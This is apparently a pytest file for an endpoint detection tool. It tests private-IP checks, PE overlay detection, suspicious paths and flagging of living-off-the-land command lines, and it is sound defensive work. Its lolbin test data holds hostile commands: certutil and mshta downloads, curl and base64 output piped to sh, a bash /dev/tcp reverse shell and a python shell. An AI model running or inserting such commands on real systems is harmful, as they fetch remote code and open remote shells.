"""Detection rules: private IPs, padded binaries, living-off-the-land command lines, suspicious paths."""
import struct
import sys

import pytest

from sentinel import rules
from sentinel.collectors.persistence import parse_exe
from sentinel.osinfo import IS_MAC, IS_WIN


@pytest.mark.parametrize("ip,private", [("10.1.2.3", True), ("192.168.0.5", True), ("100.101.102.103", True),
                                        ("127.0.0.1", True), ("fe80::1", True), ("8.8.8.8", False),
                                        ("203.0.113.66", True), ("2606:4700::1111", False)])
def test_is_private(ip, private):
    assert rules.is_private(ip) is private


def _fake_pe(path, overlay_bytes):
    """Minimal PE32+ file: 1 section of 0x200 bytes at 0x200, then `overlay_bytes` of padding."""
    buf = bytearray(0x400)
    buf[0:2] = b"MZ"
    struct.pack_into("<I", buf, 0x3C, 0x80)
    buf[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<HH", buf, 0x84, 0x8664, 1)          # machine, number of sections
    struct.pack_into("<H", buf, 0x84 + 16, 0xF0)           # size of optional header
    opt = 0x98
    struct.pack_into("<H", buf, opt, 0x20B)                # PE32+
    sec = opt + 0xF0
    buf[sec:sec + 8] = b".text\0\0\0"
    struct.pack_into("<II", buf, sec + 16, 0x200, 0x200)   # SizeOfRawData, PointerToRawData
    path.write_bytes(bytes(buf) + b"\xCC" * overlay_bytes)


def test_overlay_detects_padding(tmp_path):
    padded, clean = tmp_path / "padded.exe", tmp_path / "clean.exe"
    _fake_pe(padded, 3 * 1024 * 1024)
    _fake_pe(clean, 0)
    assert rules.overlay_size(str(padded)) == 3 * 1024 * 1024
    assert rules.overlay_size(str(clean)) == 0
    assert rules.overlay_size(str(tmp_path / "missing.exe")) == 0


@pytest.mark.parametrize("exe,cmd", [
    ("powershell.exe", "powershell.exe -NoProfile -enc SQBFAFgA"),
    ("certutil.exe", "certutil.exe -urlcache -split -f http://x/a.exe a.exe"),
    ("mshta.exe", "mshta.exe http://evil.example/a.hta"),
    ("bash", "bash -c curl -s http://x.example/i.sh | sh"),
    ("bash", "bash -c echo aGk= | base64 -d | sh"),
    ("bash", "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"),
    ("python3", "python3 -c import socket,subprocess;s=socket.socket();subprocess.call(['/bin/sh'])"),
])
def test_lolbin_patterns(exe, cmd):
    a = rules.assess(("C:\\Windows\\System32\\" if exe.endswith(".exe") else "/usr/bin/") + exe, cmd)
    assert "lolbin" in a["flags"]


@pytest.mark.parametrize("exe,cmd", [("powershell.exe", "powershell.exe -NoProfile -File C:\\scripts\\backup.ps1"),
                                     ("bash", "bash -c ls -la /home"), ("python3", "python3 manage.py runserver")])
def test_benign_command_lines(exe, cmd):
    a = rules.assess(("C:\\Windows\\System32\\" if exe.endswith(".exe") else "/usr/bin/") + exe, cmd)
    assert "lolbin" not in a["flags"]


def test_suspicious_locations():
    if IS_WIN:
        assert rules.suspicious_location(r"C:\ProgramData\{8C2E41D7-5A9B-4F10-9C3E-2B7D6A1F0E44}\x.exe")
        assert rules.suspicious_location(r"C:\Users\Public\a.exe")
        assert not rules.suspicious_location(r"C:\Program Files\App\app.exe")
    elif IS_MAC:
        assert rules.suspicious_location("/private/tmp/x")
        assert rules.suspicious_location("/Users/Shared/x")
        assert not rules.suspicious_location("/Applications/Slack.app/Contents/MacOS/Slack")
    else:
        assert rules.suspicious_location("/tmp/x")
        assert rules.suspicious_location("/dev/shm/x")
        assert rules.suspicious_location("/usr/bin/x (deleted)")
        assert not rules.suspicious_location("/tmp/.mount_App123/AppRun")
        assert not rules.suspicious_location("/usr/bin/firefox")


def test_parse_exe():
    if IS_WIN:
        assert parse_exe('"C:\\Program Files\\App\\app.exe" --tray') == "C:\\Program Files\\App\\app.exe"
        assert parse_exe("C:\\Tools\\x.exe /silent").lower() == "c:\\tools\\x.exe"
    else:
        assert parse_exe("/usr/bin/env FOO=1 /opt/app/run --x") == "/opt/app/run"
        assert parse_exe("'/Applications/My App.app/Contents/MacOS/My App' -psn") == "/Applications/My App.app/Contents/MacOS/My App"


@pytest.mark.skipif(sys.platform != "win32", reason="Windows hidden attribute")
def test_appdata_is_not_hidden_dir(tmp_path):
    assert not rules.in_hidden_dir(str(tmp_path / "x.exe"))
